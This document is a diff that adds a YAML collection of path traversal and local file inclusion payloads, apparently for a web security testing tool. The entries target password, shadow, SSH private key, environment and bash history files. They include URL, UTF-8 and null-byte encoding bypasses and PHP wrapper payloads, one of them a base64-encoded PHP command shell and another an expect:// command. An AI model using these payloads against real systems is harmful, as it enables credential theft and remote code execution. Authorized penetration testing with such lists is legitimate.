@@ -1,0 +1,225 @@
+name: "Path Traversal Payloads"
+description: "Path traversal/LFI payloads for file access testing"
+attack_type: "path_traversal"
+category: "general"
+
+payloads:
+  # Basic Unix traversal
+  - value: "../../../etc/passwd"
+    description: "Basic traversal to passwd"
+    tags: ["basic", "unix"]
+
+  - value: "../../../../etc/passwd"
+    description: "4 levels to passwd"
+    tags: ["basic", "unix"]
+
+  - value: "../../../../../etc/passwd"
+    description: "5 levels to passwd"
+    tags: ["basic", "unix"]
+
+  - value: "../../../../../../etc/passwd"
+    description: "6 levels to passwd"
+    tags: ["basic", "unix"]
+
+  - value: "../../../../../../../etc/passwd"
+    description: "7 levels to passwd"
+    tags: ["basic", "unix"]
+
+  # Absolute paths (Unix)
+  - value: "/etc/passwd"
+    description: "Absolute passwd"
+    tags: ["absolute", "unix"]
+
+  - value: "/etc/shadow"
+    description: "Absolute shadow"
+    tags: ["absolute", "unix"]
+
+  - value: "/etc/hosts"
+    description: "Absolute hosts"
+    tags: ["absolute", "unix"]
+
+  - value: "/proc/self/environ"
+    description: "Process environment"
+    tags: ["absolute", "unix", "proc"]
+
+  - value: "/proc/version"
+    description: "Kernel version"
+    tags: ["absolute", "unix", "proc"]
+
+  - value: "/proc/self/cmdline"
+    description: "Process cmdline"
+    tags: ["absolute", "unix", "proc"]
+
+  # Basic Windows traversal
+  - value: "..\\..\\..\\windows\\win.ini"
+    description: "Windows backslash traversal"
+    tags: ["basic", "windows"]
+
+  - value: "..\\..\\..\\..\\windows\\win.ini"
+    description: "4 levels Windows"
+    tags: ["basic", "windows"]
+
+  - value: "../../../windows/win.ini"
+    description: "Windows with forward slash"
+    tags: ["basic", "windows"]
+
+  # Absolute paths (Windows)
+  - value: "C:\\Windows\\win.ini"
+    description: "Absolute win.ini"
+    tags: ["absolute", "windows"]
+
+  - value: "C:\\boot.ini"
+    description: "Absolute boot.ini"
+    tags: ["absolute", "windows"]
+
+  - value: "C:\\Windows\\System32\\drivers\\etc\\hosts"
+    description: "Windows hosts file"
+    tags: ["absolute", "windows"]
+
+  # URL encoded
+  - value: "..%2F..%2F..%2Fetc%2Fpasswd"
+    description: "URL encoded traversal"
+    tags: ["encoded", "url"]
+
+  - value: "..%252F..%252F..%252Fetc%252Fpasswd"
+    description: "Double URL encoded"
+    tags: ["encoded", "double-url"]
+
+  - value: "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+    description: "Fully URL encoded"
+    tags: ["encoded", "url"]
+
+  - value: "%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+    description: "Partial URL encoded"
+    tags: ["encoded", "url"]
+
+  - value: "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
+    description: "Overlong UTF-8 encoding"
+    tags: ["encoded", "utf8", "overlong"]
+
+  - value: "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd"
+    description: "UTF-8 alternate encoding"
+    tags: ["encoded", "utf8"]
+
+  # Unicode encoding
+  - value: "..\\u002f..\\u002f..\\u002fetc\\u002fpasswd"
+    description: "Unicode slash encoding"
+    tags: ["encoded", "unicode"]
+
+  # Null byte injection (legacy)
+  - value: "../../../etc/passwd%00"
+    description: "Null byte terminated"
+    tags: ["null-byte", "legacy"]
+
+  - value: "../../../etc/passwd%00.jpg"
+    description: "Null byte with extension"
+    tags: ["null-byte", "extension"]
+
+  - value: "../../../etc/passwd\x00"
+    description: "Raw null byte"
+    tags: ["null-byte", "raw"]
+
+  # Double encoding
+  - value: "....//....//....//etc/passwd"
+    description: "Double dot-slash"
+    tags: ["bypass", "double"]
+
+  - value: "..../..../..../etc/passwd"
+    description: "Quad dots"
+    tags: ["bypass", "double"]
+
+  - value: "....\\\\....\\\\....\\\\windows\\win.ini"
+    description: "Double backslash Windows"
+    tags: ["bypass", "double", "windows"]
+
+  # Filter bypass variations
+  - value: "..././..././..././etc/passwd"
+    description: "Nested traversal"
+    tags: ["bypass", "nested"]
+
+  - value: "..;/..;/..;/etc/passwd"
+    description: "Semicolon bypass"
+    tags: ["bypass", "semicolon"]
+
+  - value: "..\\..\\..\\/etc/passwd"
+    description: "Mixed slash types"
+    tags: ["bypass", "mixed"]
+
+  - value: "..//..//..//etc/passwd"
+    description: "Double slash bypass"
+    tags: ["bypass", "double-slash"]
+
+  - value: "..%00/..%00/..%00/etc/passwd"
+    description: "Null byte in path"
+    tags: ["bypass", "null-byte"]
+
+  # Wrapper protocols (PHP)
+  - value: "php://filter/convert.base64-encode/resource=/etc/passwd"
+    description: "PHP filter wrapper"
+    tags: ["wrapper", "php", "filter"]
+
+  - value: "php://input"
+    description: "PHP input wrapper"
+    tags: ["wrapper", "php"]
+
+  - value: "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+"
+    description: "PHP data wrapper"
+    tags: ["wrapper", "php", "data"]
+
+  - value: "expect://id"
+    description: "Expect wrapper"
+    tags: ["wrapper", "php", "expect"]
+
+  - value: "file:///etc/passwd"
+    description: "File protocol"
+    tags: ["wrapper", "file"]
+
+  # Java specific
+  - value: "....//....//....//etc/passwd"
+    description: "Java path normalization"
+    tags: ["java", "bypass"]
+
+  # Interesting files (Unix)
+  - value: "../../../etc/passwd"
+    description: "User list"
+    tags: ["unix", "file"]
+
+  - value: "../../../etc/shadow"
+    description: "Password hashes"
+    tags: ["unix", "file"]
+
+  - value: "../../../etc/group"
+    description: "Group file"
+    tags: ["unix", "file"]
+
+  - value: "../../../etc/hostname"
+    description: "Hostname"
+    tags: ["unix", "file"]
+
+  - value: "../../../etc/issue"
+    description: "OS banner"
+    tags: ["unix", "file"]
+
+  - value: "../../../etc/motd"
+    description: "Message of the day"
+    tags: ["unix", "file"]
+
+  - value: "../../../var/log/apache2/access.log"
+    description: "Apache access log"
+    tags: ["unix", "log"]
+
+  - value: "../../../var/log/nginx/access.log"
+    description: "Nginx access log"
+    tags: ["unix", "log"]
+
+  - value: "../../../proc/self/environ"
+    description: "Environment variables"
+    tags: ["unix", "proc"]
+
+  - value: "../../../root/.ssh/id_rsa"
+    description: "SSH private key"
+    tags: ["unix", "ssh"]
+
+  - value: "../../../root/.bash_history"
+    description: "Bash history"
+    tags: ["unix", "history"]
